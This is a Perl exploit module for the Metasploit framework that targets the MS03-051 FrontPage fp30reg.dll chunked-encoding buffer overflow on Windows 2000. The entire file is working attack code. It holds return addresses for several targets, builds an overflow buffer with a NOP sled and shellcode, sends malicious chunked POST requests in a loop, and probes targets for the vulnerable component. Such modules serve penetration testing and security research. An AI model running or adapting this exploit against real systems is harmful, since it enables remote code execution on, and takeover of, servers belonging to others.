package Msf::Exploit::frontpage_fp30reg_chunked;
use base "Msf::Exploit";
use strict;

my $defaults = { }; 

my $info =
{
    'Name'  => 'Frontpage fp30reg.dll Chunked Encoding',
    'Version'  => '2.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Size'  => 1024,
                 'BadChars'  => "\x00+&=%\x0a\x0d\x20",
               },
    
    'Description'  => "This is an exploit for the chunked encoding buffer overflow described in MS03-051 ".
                      "and originally reported by Brett Moore. This particular modules works against versions ".
                      "of Windows 2000 between SP0 and SP3. Service Pack 4 fixes the issue.",
                      
    'Refs'  =>  [  
                    'http ://www.microsoft.com/technet/security/bulletin/ms03-051.asp'
                ],
    'Targets' => [
                   ['Windows 2000 SP0-SP3',  0x6c38a4d0],   # from mfc42.dll
                   ['Windows 2000 07/22/02', 0x67d44eb1],   # from fp30reg.dll 07/22/2002
                   ['Windows 2000 10/06/99', 0x67d4665d],   # from fp30reg.dll 10/06/1999
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Defaults' => $defaults}, @_);
  $info->{'Payload'}->{'Size'} = $self->GetVar('RetLength');
  return($self);
}

sub Exploit {
    my $obj = shift;

    my $target_host = $obj->GetVar('RHOST');
    my $target_port = $obj->GetVar('RPORT');
    my $target_idx  = $obj->GetVar('TARGET');
    my $shellcode   = $obj->_EncodedPayload->Payload;
  
    my @targets;
    my @offsets;
    my $pad;

    my $ret = defined($target_idx) ? ($obj->{'Info'}->{'Targets'}->[ $target_idx ]->[1]) : $obj->{'Info'}->{'Targets'}->[0]->[1];
    my $pattern = Pex::PatternCreate(0xDEAD);
    
    my $count = 0;
    while (1)
    {
        if ($count % 3 == 0)
        {
            print "[*] Refreshing remote process...\n";
            my $res = $obj->Check();
            $count = 0;
        }

        substr($pattern, 128, 4, pack("L", $ret));
        substr($pattern, 264, 4, pack("L", $ret));
        substr($pattern, 160, 7, "\x2d\xff\xfe\xff\xff" . "\xff\xe0");
        substr($pattern, 280, 512, "\x90" x 512);
        substr($pattern, 792, length($shellcode), $shellcode);

        my $request;
        $request  = "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n";
        $request .= "Host: $target_host:$target_port\r\n";
        $request .= "Transfer-Encoding: chunked\r\n";
        $request .= "\r\n";
        $request .= "DEAD\r\n";
        $request .= $pattern . "\r\n";
        $request .= "0\r\n";

        my $s = Pex::Socket->new( {"SSL" => $obj->GetVar('SSL')} );
        if (! $s->tcp($target_host, $target_port))
        {
            $obj->FatalError("Could not connect: " . $s->get_error());
            return;
        }

        $obj->PrintLine("Sending exploit request...");
        $s->send($request);
        sleep(1);
        $s->close();
        $count++;
    }
    
}

sub Check {
    my ($obj) = @_;
    my $target_host = $obj->GetVar('RHOST');
    my $target_port = $obj->GetVar('RPORT');
    
    my $getreq = "GET /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n".
                 "Host: $target_host:$target_port\r\n\r\n";
 
    my $s = Pex::Socket->new( {"SSL" => $obj->GetVar('SSL')} );
    
    if (! $s)
    {
        $obj->SetError("Socket creation error");
        return undef;
    }
    
    if (! $s->tcp($target_host, $target_port))
    {
        $obj->SetError("Could not connect: " . $s->get_error());
        return undef;
    }
    
    $s->send($getreq);
    my $res = $s->recv(10);
    $s->close();
    
    if ($res !~ /501 Not Implemented/)
    {
        return("Frontpage component not found");
    }
    
    return("Frontpage component found :)");

}
1;
